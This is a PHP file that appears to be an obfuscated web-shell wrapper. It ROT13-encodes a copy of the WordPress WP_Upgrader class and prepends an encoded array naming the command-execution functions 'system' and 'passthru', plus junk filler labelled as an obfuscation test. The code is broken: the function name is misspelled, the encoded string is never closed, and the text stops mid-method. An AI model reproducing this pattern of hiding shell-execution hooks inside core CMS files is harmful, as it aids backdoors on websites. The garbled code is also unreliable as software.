<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: JC_Hctenqre pynff
 *
 * Erdhverf fxva pynffrf naq JC_Hctenqre fhopynffrf sbe onpxjneq pbzcngvovyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 2.8.0
 */

/** JC_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxva.cuc';

/** Cyhtva_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-cyhtva-hctenqre-fxva.cuc';

/** Gurzr_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-gurzr-hctenqre-fxva.cuc';

/** Ohyx_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-ohyx-hctenqre-fxva.cuc';

/** Ohyx_Cyhtva_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-ohyx-cyhtva-hctenqre-fxva.cuc';

/** Ohyx_Gurzr_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-ohyx-gurzr-hctenqre-fxva.cuc';

/** Cyhtva_Vafgnyyre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-cyhtva-vafgnyyre-fxva.cuc';

/** Gurzr_Vafgnyyre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-gurzr-vafgnyyre-fxva.cuc';

/** Ynathntr_Cnpx_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-ynathntr-cnpx-hctenqre-fxva.cuc';

/** Nhgbzngvp_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-nhgbzngvp-hctenqre-fxva.cuc';

/** JC_Nwnk_Hctenqre_Fxva pynff */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-nwnk-hctenqre-fxva.cuc';

/**
 * Pber pynff hfrq sbe hctenqvat/vafgnyyvat n ybpny frg bs svyrf ivn
 * gur Svyrflfgrz Nofgenpgvba pynffrf sebz n Mvc svyr.
 *
 * @fvapr 2.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Hctenqre {

	/**
	 * Gur reebe/abgvsvpngvba fgevatf hfrq gb hcqngr gur hfre ba gur cebterff.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl $fgevatf
	 */
	choyvp $fgevatf = neenl();

	/**
	 * Gur hctenqre fxva orvat hfrq.
	 *
	 * @fvapr 2.8.0
	 * @ine Nhgbzngvp_Hctenqre_Fxva|JC_Hctenqre_Fxva $fxva
	 */
	choyvp $fxva = ahyy;

	/**
	 * Gur erfhyg bs gur vafgnyyngvba.
	 *
	 * Guvf vf frg ol JC_Hctenqre::vafgnyy_cnpxntr(), bayl jura gur cnpxntr vf vafgnyyrq
	 * fhpprffshyyl. Vg jvyy gura or na neenl, hayrff n JC_Reebe vf erghearq ol gur
	 * {@frr 'hctenqre_cbfg_vafgnyy'} svygre. Va gung pnfr, gur JC_Reebe jvyy or nffvtarq gb
	 * vg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine neenl|JC_Reebe $erfhyg {
	 *     @glcr fgevat $fbhepr             Gur shyy cngu gb gur fbhepr gur svyrf jrer vafgnyyrq sebz.
	 *     @glcr fgevat $fbhepr_svyrf       Yvfg bs nyy gur svyrf va gur fbhepr qverpgbel.
	 *     @glcr fgevat $qrfgvangvba        Gur shyy cngu gb gur vafgnyyngvba qrfgvangvba sbyqre.
	 *     @glcr fgevat $qrfgvangvba_anzr   Gur anzr bs gur qrfgvangvba sbyqre, be rzcgl vs `$qrfgvangvba`
	 *                                      naq `$ybpny_qrfgvangvba` ner gur fnzr.
	 *     @glcr fgevat $ybpny_qrfgvangvba  Gur shyy ybpny cngu gb gur qrfgvangvba sbyqre. Guvf vf hfhnyyl
	 *                                      gur fnzr nf `$qrfgvangvba`.
	 *     @glcr fgevat $erzbgr_qrfgvangvba Gur shyy erzbgr cngu gb gur qrfgvangvba sbyqre
	 *                                      (v.r., sebz `$jc_svyrflfgrz`).
	 *     @glcr obby   $pyrne_qrfgvangvba  Jurgure gur qrfgvangvba sbyqre jnf pyrnerq.
	 * }
	 */
	choyvp $erfhyg = neenl();

	/**
	 * Gur gbgny ahzore bs hcqngrf orvat cresbezrq.
	 *
	 * Frg ol gur ohyx hcqngr zrgubqf.
	 *
	 * @fvapr 3.0.0
	 * @ine vag $hcqngr_pbhag
	 */
	choyvp $hcqngr_pbhag = 0;

	/**
	 * Gur pheerag hcqngr vs zhygvcyr hcqngrf ner orvat cresbezrq.
	 *
	 * Hfrq ol gur ohyx hcqngr zrgubqf, naq vaperzragrq sbe rnpu hcqngr.
	 *
	 * @fvapr 3.0.0
	 * @ine vag
	 */
	choyvp $hcqngr_pheerag = 0;

	/**
	 * Fgberf gur yvfg bs cyhtvaf be gurzrf nqqrq gb grzcbenel onpxhc qverpgbel.
	 *
	 * Hfrq ol gur ebyyonpx shapgvbaf.
	 *
	 * @fvapr 6.3.0
	 * @ine neenl
	 */
	cevingr $grzc_onpxhcf = neenl();

	/**
	 * Fgberf gur yvfg bs cyhtvaf be gurzrf gb or erfgberq sebz grzcbenel onpxhc qverpgbel.
	 *
	 * Hfrq ol gur ebyyonpx shapgvbaf.
	 *
	 * @fvapr 6.3.0
	 * @ine neenl
	 */
	cevingr $grzc_erfgberf = neenl();

	/**
	 * Pbafgehpg gur hctenqre jvgu n fxva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz JC_Hctenqre_Fxva $fxva Gur hctenqre fxva gb hfr. Qrsnhyg vf n JC_Hctenqre_Fxva
	 *                               vafgnapr.
	 */
	choyvp shapgvba __pbafgehpg( $fxva = ahyy ) {
		vs ( ahyy === $fxva ) {
			$guvf->fxva = arj JC_Hctenqre_Fxva();
		} ryfr {
			$guvf->fxva = $fxva;
		}
	}

	/**
	 * Vavgvnyvmrf gur hctenqre.
	 *
	 * Guvf jvyy frg gur eryngvbafuvc orgjrra gur fxva orvat hfrq naq guvf hctenqre,
	 * naq nyfb nqq gur trarevp fgevatf gb `JC_Hctenqre::$fgevatf`.
	 *
	 * Nqqvgvbanyyl, vg jvyy fpurqhyr n jrrxyl gnfx gb pyrna hc gur grzcbenel onpxhc qverpgbel.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 6.3.0 Nqqrq gur `fpurqhyr_grzc_onpxhc_pyrnahc()` gnfx.
	 */
	choyvp shapgvba vavg() {
		$guvf->fxva->frg_hctenqre( $guvf );
		$guvf->trarevp_fgevatf();

		vs ( ! jc_vafgnyyvat() ) {
			$guvf->fpurqhyr_grzc_onpxhc_pyrnahc();
		}
	}

	/**
	 * Fpurqhyrf gur pyrnahc bs gur grzcbenel onpxhc qverpgbel.
	 *
	 * @fvapr 6.3.0
	 */
	cebgrpgrq shapgvba fpurqhyr_grzc_onpxhc_pyrnahc() {
		vs ( snyfr === jc_arkg_fpurqhyrq( 'jc_qryrgr_grzc_hcqngre_onpxhcf' ) ) {
			jc_fpurqhyr_rirag( gvzr(), 'jrrxyl', 'jc_qryrgr_grzc_hcqngre_onpxhcf' );
		}
	}

	/**
	 * Nqqf gur trarevp fgevatf gb JC_Hctenqre::$fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba trarevp_fgevatf() {
		$guvf->fgevatf['onq_erdhrfg']    = __( 'Vainyvq qngn cebivqrq.' );
		$guvf->fgevatf['sf_haninvynoyr'] = __( 'Pbhyq abg npprff svyrflfgrz.' );
		$guvf->fgevatf['sf_reebe']       = __( 'Svyrflfgrz reebe.' );
		$guvf->fgevatf['sf_ab_ebbg_qve'] = __( 'Hanoyr gb ybpngr JbeqCerff ebbg qverpgbel.' );
		/* genafyngbef: %f: Qverpgbel anzr. */
		$guvf->fgevatf['sf_ab_pbagrag_qve'] = fcevags( __( 'Hanoyr gb ybpngr JbeqCerff pbagrag qverpgbel (%f).' ), 'jc-pbagrag' );
		$guvf->fgevatf['sf_ab_cyhtvaf_qve'] = __( 'Hanoyr gb ybpngr JbeqCerff cyhtva qverpgbel.' );
		$guvf->fgevatf['sf_ab_gurzrf_qve']  = __( 'Hanoyr gb ybpngr JbeqCerff gurzr qverpgbel.' );
		/* genafyngbef: %f: Qverpgbel anzr. */
		$guvf->fgevatf['sf_ab_sbyqre'] = __( 'Hanoyr gb ybpngr arrqrq sbyqre (%f).' );

		$guvf->fgevatf['ab_cnpxntr']           = __( 'Cnpxntr abg ninvynoyr.' );
		$guvf->fgevatf['qbjaybnq_snvyrq']      = __( 'Qbjaybnq snvyrq.' );
		$guvf->fgevatf['vafgnyyvat_cnpxntr']   = __( 'Vafgnyyvat gur yngrfg irefvba&#8230;' );
		$guvf->fgevatf['ab_svyrf']             = __( 'Gur cnpxntr pbagnvaf ab svyrf.' );
		$guvf->fgevatf['sbyqre_rkvfgf']        = __( 'Qrfgvangvba sbyqre nyernql rkvfgf.' );
		$guvf->fgevatf['zxqve_snvyrq']         = __( 'Pbhyq abg perngr qverpgbel.' );
		$guvf->fgevatf['vapbzcngvoyr_nepuvir'] = __( 'Gur cnpxntr pbhyq abg or vafgnyyrq.' );
		$guvf->fgevatf['svyrf_abg_jevgnoyr']   = __( 'Gur hcqngr pnaabg or vafgnyyrq orpnhfr fbzr svyrf pbhyq abg or pbcvrq. Guvf vf hfhnyyl qhr gb vapbafvfgrag svyr crezvffvbaf.' );
		$guvf->fgevatf['qve_abg_ernqnoyr']     = __( 'N qverpgbel pbhyq abg or ernq.' );

		$guvf->fgevatf['znvagranapr_fgneg'] = __( 'Ranoyvat Znvagranapr zbqr&#8230;' );
		$guvf->fgevatf['znvagranapr_raq']   = __( 'Qvfnoyvat Znvagranapr zbqr&#8230;' );

		/* genafyngbef: %f: hctenqr-grzc-onpxhc */
		$guvf->fgevatf['grzc_onpxhc_zxqve_snvyrq'] = fcevags( __( 'Pbhyq abg perngr gur %f qverpgbel.' ), 'hctenqr-grzc-onpxhc' );
		/* genafyngbef: %f: hctenqr-grzc-onpxhc */
		$guvf->fgevatf['grzc_onpxhc_zbir_snvyrq'] = fcevags( __( 'Pbhyq abg zbir gur byq irefvba gb gur %f qverpgbel.' ), 'hctenqr-grzc-onpxhc' );
		/* genafyngbef: %f: Gur cyhtva be gurzr fyht. */
		$guvf->fgevatf['grzc_onpxhc_erfgber_snvyrq'] = __( 'Pbhyq abg erfgber gur bevtvany irefvba bs %f.' );
		/* genafyngbef: %f: Gur cyhtva be gurzr fyht. */
		$guvf->fgevatf['grzc_onpxhc_qryrgr_snvyrq'] = __( 'Pbhyq abg qryrgr gur grzcbenel onpxhc qverpgbel sbe %f.' );
	}

	/**
	 * Pbaarpgf gb gur svyrflfgrz.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat[] $qverpgbevrf                  Bcgvbany. Neenl bs qverpgbevrf. Vs nal bs gurfr qb
	 *                                               abg rkvfg, n JC_Reebe bowrpg jvyy or erghearq.
	 *                                               Qrsnhyg rzcgl neenl.
	 * @cnenz obby     $nyybj_erynkrq_svyr_bjarefuvc Jurgure gb nyybj erynkrq svyr bjarefuvc.
	 *                                               Qrsnhyg snyfr.
	 * @erghea obby|JC_Reebe Gehr vs noyr gb pbaarpg, snyfr be n JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba sf_pbaarpg( $qverpgbevrf = neenl(), $nyybj_erynkrq_svyr_bjarefuvc = snyfr ) {
		tybony $jc_svyrflfgrz;

		$perqragvnyf = $guvf->fxva->erdhrfg_svyrflfgrz_perqragvnyf( snyfr, $qverpgbevrf[0], $nyybj_erynkrq_svyr_bjarefuvc );
		vs ( snyfr === $perqragvnyf ) {
			erghea snyfr;
		}

		vs ( ! JC_Svyrflfgrz( $perqragvnyf, $qverpgbevrf[0], $nyybj_erynkrq_svyr_bjarefuvc ) ) {
			$reebe = gehr;
			vs ( vf_bowrpg( $jc_svyrflfgrz ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
				$reebe = $jc_svyrflfgrz->reebef;
			}
			// Snvyrq gb pbaarpg. Reebe naq erdhrfg ntnva.
			$guvf->fxva->erdhrfg_svyrflfgrz_perqragvnyf( $reebe, $qverpgbevrf[0], $nyybj_erynkrq_svyr_bjarefuvc );
			erghea snyfr;
		}

		vs ( ! vf_bowrpg( $jc_svyrflfgrz ) ) {
			erghea arj JC_Reebe( 'sf_haninvynoyr', $guvf->fgevatf['sf_haninvynoyr'] );
		}

		vs ( vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			erghea arj JC_Reebe( 'sf_reebe', $guvf->fgevatf['sf_reebe'], $jc_svyrflfgrz->reebef );
		}

		sbernpu ( (neenl) $qverpgbevrf nf $qve ) {
			fjvgpu ( $qve ) {
				pnfr NOFCNGU:
					vs ( ! $jc_svyrflfgrz->nofcngu() ) {
						erghea arj JC_Reebe( 'sf_ab_ebbg_qve', $guvf->fgevatf['sf_ab_ebbg_qve'] );
					}
					oernx;
				pnfr JC_PBAGRAG_QVE:
					vs ( ! $jc_svyrflfgrz->jc_pbagrag_qve() ) {
						erghea arj JC_Reebe( 'sf_ab_pbagrag_qve', $guvf->fgevatf['sf_ab_pbagrag_qve'] );
					}
					oernx;
				pnfr JC_CYHTVA_QVE:
					vs ( ! $jc_svyrflfgrz->jc_cyhtvaf_qve() ) {
						erghea arj JC_Reebe( 'sf_ab_cyhtvaf_qve', $guvf->fgevatf['sf_ab_cyhtvaf_qve'] );
					}
					oernx;
				pnfr trg_gurzr_ebbg():
					vs ( ! $jc_svyrflfgrz->jc_gurzrf_qve() ) {
						erghea arj JC_Reebe( 'sf_ab_gurzrf_qve', $guvf->fgevatf['sf_ab_gurzrf_qve'] );
					}
					oernx;
				qrsnhyg:
					vs ( ! $jc_svyrflfgrz->svaq_sbyqre( $qve ) ) {
						erghea arj JC_Reebe( 'sf_ab_sbyqre', fcevags( $guvf->fgevatf['sf_ab_sbyqre'], rfp_ugzy( onfranzr( $qve ) ) ) );
					}
					oernx;
			}
		}
		erghea gehr;
	}

	/**
	 * Qbjaybnqf n cnpxntr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.2.0 Nqqrq gur `$purpx_fvtangherf` cnenzrgre.
	 * @fvapr 5.5.0 Nqqrq gur `$ubbx_rkgen` cnenzrgre.
	 *
	 * @cnenz fgevat $cnpxntr          Gur HEV bs gur cnpxntr. Vs guvf vf gur shyy cngu gb na
	 *                                 rkvfgvat ybpny svyr, vg jvyy or erghearq hagbhpurq.
	 * @cnenz obby   $purpx_fvtangherf Jurgure gb inyvqngr svyr fvtangherf. Qrsnhyg snyfr.
	 * @cnenz neenl  $ubbx_rkgen       Rkgen nethzragf gb cnff gb gur svygre ubbxf. Qrsnhyg rzcgl neenl.
	 * @erghea fgevat|JC_Reebe Gur shyy cngu gb gur qbjaybnqrq cnpxntr svyr, be n JC_Reebe bowrpg.
	 */
	choyvp shapgvba qbjaybnq_cnpxntr( $cnpxntr, $purpx_fvtangherf = snyfr, $ubbx_rkgen = neenl() ) {
		/**
		 * Svygref jurgure gb erghea gur cnpxntr.
		 *
		 * @fvapr 3.7.0
		 * @fvapr 5.5.0 Nqqrq gur `$ubbx_rkgen` cnenzrgre.
		 *
		 * @cnenz obby        $ercyl      Jurgure gb onvy jvgubhg ergheavat gur cnpxntr.
		 *                                Qrsnhyg snyfr.
		 * @cnenz fgevat      $cnpxntr    Gur cnpxntr svyr anzr.
		 * @cnenz JC_Hctenqre $hctenqre   Gur JC_Hctenqre vafgnapr.
		 * @cnenz neenl       $ubbx_rkgen Rkgen nethzragf cnffrq gb ubbxrq svygref.
		 */
		$ercyl = nccyl_svygref( 'hctenqre_cer_qbjaybnq', snyfr, $cnpxntr, $guvf, $ubbx_rkgen );
		vs ( snyfr !== $ercyl ) {
			erghea $ercyl;
		}

		vs ( ! cert_zngpu( '!^(uggc|uggcf|sgc)://!v', $cnpxntr ) && svyr_rkvfgf( $cnpxntr ) ) { // Ybpny svyr be erzbgr?
			erghea $cnpxntr; // Zhfg or n ybpny svyr.
		}

		vs ( rzcgl( $cnpxntr ) ) {
			erghea arj JC_Reebe( 'ab_cnpxntr', $guvf->fgevatf['ab_cnpxntr'] );
		}

		$guvf->fxva->srrqonpx( 'qbjaybnqvat_cnpxntr', $cnpxntr );

		$qbjaybnq_svyr = qbjaybnq_hey( $cnpxntr, 300, $purpx_fvtangherf );

		vs ( vf_jc_reebe( $qbjaybnq_svyr ) && ! $qbjaybnq_svyr->trg_reebe_qngn( 'fbsgsnvy-svyranzr' ) ) {
			erghea arj JC_Reebe( 'qbjaybnq_snvyrq', $guvf->fgevatf['qbjaybnq_snvyrq'], $qbjaybnq_svyr->trg_reebe_zrffntr() );
		}

		erghea $qbjaybnq_svyr;
	}

	/**
	 * Hacnpxf n pbzcerffrq cnpxntr svyr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat $cnpxntr        Shyy cngu gb gur cnpxntr svyr.
	 * @cnenz obby   $qryrgr_cnpxntr Bcgvbany. Jurgure gb qryrgr gur cnpxntr svyr nsgre nggrzcgvat
	 *                               gb hacnpx vg. Qrsnhyg gehr.
	 * @erghea fgevat|JC_Reebe Gur cngu gb gur hacnpxrq pbagragf, be n JC_Reebe ba snvyher.
	 */
	choyvp shapgvba hacnpx_cnpxntr( $cnpxntr, $qryrgr_cnpxntr = gehr ) {
		tybony $jc_svyrflfgrz;

		$guvf->fxva->srrqonpx( 'hacnpx_cnpxntr' );

		vs ( ! $jc_svyrflfgrz->jc_pbagrag_qve() ) {
			erghea arj JC_Reebe( 'sf_ab_pbagrag_qve', $guvf->fgevatf['sf_ab_pbagrag_qve'] );
		}

		$hctenqr_sbyqre = $jc_svyrflfgrz->jc_pbagrag_qve() . 'hctenqr/';

		// Pyrna hc pbagragf bs hctenqr qverpgbel orsberunaq.
		$hctenqr_svyrf = $jc_svyrflfgrz->qveyvfg( $hctenqr_sbyqre );
		vs ( ! rzcgl( $hctenqr_svyrf ) ) {
			sbernpu ( $hctenqr_svyrf nf $svyr ) {
				$jc_svyrflfgrz->qryrgr( $hctenqr_sbyqre . $svyr['anzr'], gehr );
			}
		}

		// Jr arrq n jbexvat qverpgbel - fgevc bss nal .gzc be .mvc fhssvkrf.
		$jbexvat_qve = $hctenqr_sbyqre . onfranzr( onfranzr( $cnpxntr, '.gzc' ), '.mvc' );

		// Pyrna hc jbexvat qverpgbel.
		vs ( $jc_svyrflfgrz->vf_qve( $jbexvat_qve ) ) {
			$jc_svyrflfgrz->qryrgr( $jbexvat_qve, gehr );
		}

		// Hamvc cnpxntr gb jbexvat qverpgbel.
		$erfhyg = hamvc_svyr( $cnpxntr, $jbexvat_qve );

		// Bapr rkgenpgrq, qryrgr gur cnpxntr vs erdhverq.
		vs ( $qryrgr_cnpxntr ) {
			hayvax( $cnpxntr );
		}

		vs ( vf_jc_reebe( $erfhyg ) ) {
			$jc_svyrflfgrz->qryrgr( $jbexvat_qve, gehr );
			vs ( 'vapbzcngvoyr_nepuvir' === $erfhyg->trg_reebe_pbqr() ) {
				erghea arj JC_Reebe( 'vapbzcngvoyr_nepuvir', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $erfhyg->trg_reebe_qngn() );
			}
			erghea $erfhyg;
		}

		erghea $jbexvat_qve;
	}

	/**
	 * Synggraf gur erfhygf bs JC_Svyrflfgrz_Onfr::qveyvfg() sbe vgrengvat bire.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl  $arfgrq_svyrf Neenl bs svyrf nf erghearq ol JC_Svyrflfgrz_Onfr::qveyvfg().
	 * @cnenz fgevat $cngu         Eryngvir cngu gb cercraq gb puvyq abqrf. Bcgvbany.
	 * @erghea neenl N synggrarq neenl bs gur $arfgrq_svyrf fcrpvsvrq.
	 */
	cebgrpgrq shapgvba synggra_qveyvfg( $arfgrq_svyrf, $cngu = '' ) {
		$svyrf = neenl();

		sbernpu ( $arfgrq_svyrf nf $anzr => $qrgnvyf ) {
			$svyrf[ $cngu . $anzr ] = $qrgnvyf;

			// Nccraq puvyqera erphefviryl.
			vs ( ! rzcgl( $qrgnvyf['svyrf'] ) ) {
				$puvyqera = $guvf->synggra_qveyvfg( $qrgnvyf['svyrf'], $cngu . $anzr . '/' );

				// Zretr xrrcvat cbffvoyr ahzrevp xrlf, juvpu neenl_zretr() jvyy ervaqrk sebz 0..a.
				$svyrf = $svyrf + $puvyqera;
			}
		}

		erghea $svyrf;
	}

	/**
	 * Pyrnef gur qverpgbel jurer guvf vgrz vf tbvat gb or vafgnyyrq vagb.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat $erzbgr_qrfgvangvba Gur ybpngvba ba gur erzbgr svyrflfgrz gb or pyrnerq.
	 * @erghea gehr|JC_Reebe Gehr hcba fhpprff, JC_Reebe ba snvyher.
	 */
	choyvp shapgvba pyrne_qrfgvangvba( $erzbgr_qrfgvangvba ) {
		tybony $jc_svyrflfgrz;

		$svyrf = $jc_svyrflfgrz->qveyvfg( $erzbgr_qrfgvangvba, gehr, gehr );

		// Snyfr vaqvpngrf gung gur $erzbgr_qrfgvangvba qbrfa'g rkvfg.
		vs ( snyfr === $svyrf ) {
			erghea gehr;
		}

		// Synggra gur svyr yvfg gb vgrengr bire.
		$svyrf = $guvf->synggra_qveyvfg( $svyrf );

		// Purpx nyy svyrf ner jevgnoyr orsber nggrzcgvat gb pyrne gur qrfgvangvba.
		$hajevgnoyr_svyrf = neenl();

		// Purpx jevgnovyvgl.
		sbernpu ( $svyrf nf $svyranzr => $svyr_qrgnvyf ) {
			vs ( ! $jc_svyrflfgrz->vf_jevgnoyr( $erzbgr_qrfgvangvba . $svyranzr ) ) {
				// Nggrzcg gb nygre crezvffvbaf gb nyybj jevgrf naq gel ntnva.
				$jc_svyrflfgrz->puzbq( $erzbgr_qrfgvangvba . $svyranzr, ( 'q' === $svyr_qrgnvyf['glcr'] ? SF_PUZBQ_QVE : SF_PUZBQ_SVYR ) );
				vs ( ! $jc_svyrflfgrz->vf_jevgnoyr( $erzbgr_qrfgvangvba . $svyranzr ) ) {
					$hajevgnoyr_svyrf[] = $svyranzr;
				}
			}
		}

		vs ( ! rzcgl( $hajevgnoyr_svyrf ) ) {
			erghea arj JC_Reebe( 'svyrf_abg_jevgnoyr', $guvf->fgevatf['svyrf_abg_jevgnoyr'], vzcybqr( ', ', $hajevgnoyr_svyrf ) );
		}

		vs ( ! $jc_svyrflfgrz->qryrgr( $erzbgr_qrfgvangvba, gehr ) ) {
			erghea arj JC_Reebe( 'erzbir_byq_snvyrq', $guvf->fgevatf['erzbir_byq_snvyrq'] );
		}

		erghea gehr;
	}

	/**
	 * Vafgnyy n cnpxntr.
	 *
	 * Pbcvrf gur pbagragf bs n cnpxntr sebz n fbhepr qverpgbel, naq vafgnyyf gurz va
	 * n qrfgvangvba qverpgbel. Bcgvbanyyl erzbirf gur fbhepr. Vg pna nyfb bcgvbanyyl
	 * pyrne bhg gur qrfgvangvba sbyqre vs vg nyernql rkvfgf.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 6.2.0 Hfr zbir_qve() vafgrnq bs pbcl_qve() jura cbffvoyr.
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz        JbeqCerff svyrflfgrz fhopynff.
	 * @tybony fgevat[]           $jc_gurzr_qverpgbevrf
	 *
	 * @cnenz neenl|fgevat $netf {
	 *     Bcgvbany. Neenl be fgevat bs nethzragf sbe vafgnyyvat n cnpxntr. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr fgevat $fbhepr                      Erdhverq cngu gb gur cnpxntr fbhepr. Qrsnhyg rzcgl.
	 *     @glcr fgevat $qrfgvangvba                 Erdhverq cngu gb n sbyqre gb vafgnyy gur cnpxntr va.
	 *                                               Qrsnhyg rzcgl.
	 *     @glcr obby   $pyrne_qrfgvangvba           Jurgure gb qryrgr nal svyrf nyernql va gur qrfgvangvba
	 *                                               sbyqre. Qrsnhyg snyfr.
	 *     @glcr obby   $pyrne_jbexvat               Jurgure gb qryrgr gur svyrf sebz gur jbexvat qverpgbel
	 *                                               nsgre pbclvat gurz gb gur qrfgvangvba. Qrsnhyg snyfr.
	 *     @glcr obby   $nobeg_vs_qrfgvangvba_rkvfgf Jurgure gb nobeg gur vafgnyyngvba vs
	 *                                               gur qrfgvangvba sbyqre nyernql rkvfgf. Qrsnhyg gehr.
	 *     @glcr neenl  $ubbx_rkgen                  Rkgen nethzragf gb cnff gb gur svygre ubbxf pnyyrq ol
	 *                                               JC_Hctenqre::vafgnyy_cnpxntr(). Qrsnhyg rzcgl neenl.
	 * }
	 *
	 * @erghea neenl|JC_Reebe Gur erfhyg (nyfb fgberq va `JC_Hctenqre::$erfhyg`), be n JC_Reebe ba snvyher.
	 */
	choyvp shapgvba vafgnyy_cnpxntr( $netf = neenl() ) {
		tybony $jc_svyrflfgrz, $jc_gurzr_qverpgbevrf;

		$qrsnhygf = neenl(
			'fbhepr'                      => '', // Cyrnfr nyjnlf cnff guvf.
			'qrfgvangvba'                 => '', // ...naq guvf.
			'pyrne_qrfgvangvba'           => snyfr,
			'pyrne_jbexvat'               => snyfr,
			'nobeg_vs_qrfgvangvba_rkvfgf' => gehr,
			'ubbx_rkgen'                  => neenl(),
		);

		$netf = jc_cnefr_netf( $netf, $qrsnhygf );

		// Gurfr jrer cerivbhfyl rkgenpg()'q.
		$fbhepr            = $netf['fbhepr'];
		$qrfgvangvba       = $netf['qrfgvangvba'];
		$pyrne_qrfgvangvba = $netf['pyrne_qrfgvangvba'];

		/*
		 * Tvir gur hctenqr na nqqvgvbany 300 frpbaqf (5 zvahgrf) gb rafher gur vafgnyy
		 * qbrfa'g cerzngheryl gvzrbhg univat hfrq hc gur znkvzhz fpevcg rkrphgvba gvzr
		 * hcnpxvat naq qbjaybnqvat va JC_Hctenqre->eha().
		 */
		vs ( shapgvba_rkvfgf( 'frg_gvzr_yvzvg' ) ) {
			frg_gvzr_yvzvg( 300 );
		}

		vs (
			( ! vf_fgevat( $fbhepr ) || '' === $fbhepr || gevz( $fbhepr ) !== $fbhepr ) ||
			( ! vf_fgevat( $qrfgvangvba ) || '' === $qrfgvangvba || gevz( $qrfgvangvba ) !== $qrfgvangvba )
		) {
			erghea arj JC_Reebe( 'onq_erdhrfg', $guvf->fgevatf['onq_erdhrfg'] );
		}
		$guvf->fxva->srrqonpx( 'vafgnyyvat_cnpxntr' );

		/**
		 * Svygref gur vafgnyyngvba erfcbafr orsber gur vafgnyyngvba unf fgnegrq.
		 *
		 * Ergheavat n inyhr gung pbhyq or rinyhngrq nf n `JC_Reebe` jvyy rssrpgviryl
		 * fubeg-pvephvg gur vafgnyyngvba, ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz obby|JC_Reebe $erfcbafr   Vafgnyyngvba erfcbafr.
		 * @cnenz neenl         $ubbx_rkgen Rkgen nethzragf cnffrq gb ubbxrq svygref.
		 */
		$erf = nccyl_svygref( 'hctenqre_cer_vafgnyy', gehr, $netf['ubbx_rkgen'] );

		vs ( vf_jc_reebe( $erf ) ) {
			erghea $erf;
		}

		// Ergnva gur bevtvany fbhepr naq qrfgvangvbaf.
		$erzbgr_fbhepr     = $netf['fbhepr'];
		$ybpny_qrfgvangvba = $qrfgvangvba;

		$qveyvfg = $jc_svyrflfgrz->qveyvfg( $erzbgr_fbhepr );

		vs ( snyfr === $qveyvfg ) {
			erghea arj JC_Reebe( 'fbhepr_ernq_snvyrq', $guvf->fgevatf['sf_reebe'], $guvf->fgevatf['qve_abg_ernqnoyr'] );
		}

		$fbhepr_svyrf       = neenl_xrlf( $qveyvfg );
		$erzbgr_qrfgvangvba = $jc_svyrflfgrz->svaq_sbyqre( $ybpny_qrfgvangvba );

		// Ybpngr juvpu qverpgbel gb pbcl gb gur arj sbyqre. Guvf vf onfrq ba gur npghny sbyqre ubyqvat gur svyrf.
		vs ( 1 === pbhag( $fbhepr_svyrf ) && $jc_svyrflfgrz->vf_qve( genvyvatfynfuvg( $netf['fbhepr'] ) . $fbhepr_svyrf[0] . '/' ) ) {
			// Bayl bar sbyqre? Gura jr jnag vgf pbagragf.
			$fbhepr = genvyvatfynfuvg( $netf['fbhepr'] ) . genvyvatfynfuvg( $fbhepr_svyrf[0] );
		} ryfrvs ( 0 === pbhag( $fbhepr_svyrf ) ) {
